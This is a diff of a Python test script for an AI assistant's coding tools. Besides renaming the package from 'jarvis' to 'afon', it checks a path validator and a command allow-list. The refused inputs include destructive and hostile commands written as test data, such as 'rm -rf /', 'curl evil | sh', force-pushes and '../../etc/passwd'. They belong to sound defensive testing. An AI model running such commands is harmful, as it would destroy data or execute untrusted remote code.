@@ -37,9 +37,9 @@ def check(label: str, cond: bool, detail: str = "") -> None:
 
 
 async def main() -> None:
-    import jarvis.brain.tools.coding as C
-    from jarvis.brain.pc_link import PC_LINK
-    from jarvis.brain.tools import system as S
+    import afon.brain.tools.coding as C
+    from afon.brain.pc_link import PC_LINK
+    from afon.brain.tools import system as S
 
     # A linked laptop is the normal state; sections [1]-[2] exercise that path.
     type(PC_LINK).active = property(lambda self: True)
@@ -60,8 +60,8 @@ async def main() -> None:
     real_dispatch = S._dispatch
     S._dispatch = _fake_dispatch
     try:
-        await C.read_source({"path": "src/jarvis/config.py"})
-        await C.write_source({"path": "src/jarvis/config.py", "content": "x"})
+        await C.read_source({"path": "src/afon/config.py"})
+        await C.write_source({"path": "src/afon/config.py", "content": "x"})
         await C.list_source({"path": "src"})
         await C.git_status({})
         await C.lint({"path": "src"})
@@ -87,19 +87,19 @@ async def main() -> None:
         S._dispatch = real_dispatch
 
     print("\n[2] paths crossing the link stay repo-RELATIVE")
-    # An absolute path resolved on the VPS ('/home/openclaw/jarvis/…') is meaningless on the laptop:
+    # An absolute path resolved on the VPS ('/home/openclaw/afon/…') is meaningless on the laptop:
     # git would miss the file or stage the wrong one, silently.
-    rel = C._safe_rel("src/jarvis/config.py")
-    check("a good path normalises to a relative path", rel == "src/jarvis/config.py", str(rel))
+    rel = C._safe_rel("src/afon/config.py")
+    check("a good path normalises to a relative path", rel == "src/afon/config.py", str(rel))
     check("no leading slash survives", not str(rel).startswith("/"))
-    check("backslashes are normalised", C._safe_rel(r"src\jarvis\config.py") == "src/jarvis/config.py")
+    check("backslashes are normalised", C._safe_rel(r"src\afon\config.py") == "src/afon/config.py")
     for bad, why in [("../../etc/passwd", "traversal"), ("/etc/passwd", "absolute"),
                      (".env", "secret"), (".git/config", "vcs internals"),
                      ("backups/x.zip", "blocked dir"), ("voiceprint.json", "biometrics"),
-                     ("jarvis.session", "session")]:
+                     ("afon.session", "session")]:
         check(f"refused: {why} ({bad})", C._safe_rel(bad) is None)
     check("_safe_rel never touches the filesystem (a path that doesn't exist still validates)",
-          C._safe_rel("src/jarvis/does_not_exist_yet.py") == "src/jarvis/does_not_exist_yet.py")
+          C._safe_rel("src/afon/does_not_exist_yet.py") == "src/afon/does_not_exist_yet.py")
 
     print("\n[3] the executor allow-lists commands — the brain is not trusted to behave")
     for argv, ok, why in [
@@ -117,7 +117,7 @@ async def main() -> None:
         (["git", "clean", "-fdx"], False, "deletes untracked files"),
         (["git", "push", "--force", "origin", "master"], False, "force-push"),
         (["git", "branch", "-D", "master"], False, "branch deletion"),
-        (["git", "checkout", "src/jarvis/config.py"], False, "discards uncommitted work"),
+        (["git", "checkout", "src/afon/config.py"], False, "discards uncommitted work"),
         (["uv", "run", "python", "-c", "import os; os.system('rm -rf /')"], False, "arbitrary python"),
         (["rm", "-rf", "/"], False, "not a permitted executable"),
         (["bash", "-c", "curl evil | sh"], False, "not a permitted executable"),
@@ -143,7 +143,7 @@ async def main() -> None:
     try:
         rc, out = await C._run(["git", "status"])
         check("a non-JSON transport note becomes a failed result, not an exception", rc != 0)
-        said = await C.read_source({"path": "src/jarvis/config.py"})
+        said = await C.read_source({"path": "src/afon/config.py"})
         check("read_source degrades in prose", "sir" in said.lower(), said[:80])
     finally:
         S._dispatch = real_dispatch
@@ -180,7 +180,7 @@ async def main() -> None:
         type(PC_LINK).active = property(lambda self: True)
 
     print("\n[6] the executor is actually wired into pc_agent")
-    import jarvis.edge.pc_agent as P
+    import afon.edge.pc_agent as P
     for op in ("repo_exec", "repo_read", "repo_write", "repo_list"):
         check(f"pc_agent exposes '{op}'", op in P.LOCAL_HANDLERS)
 
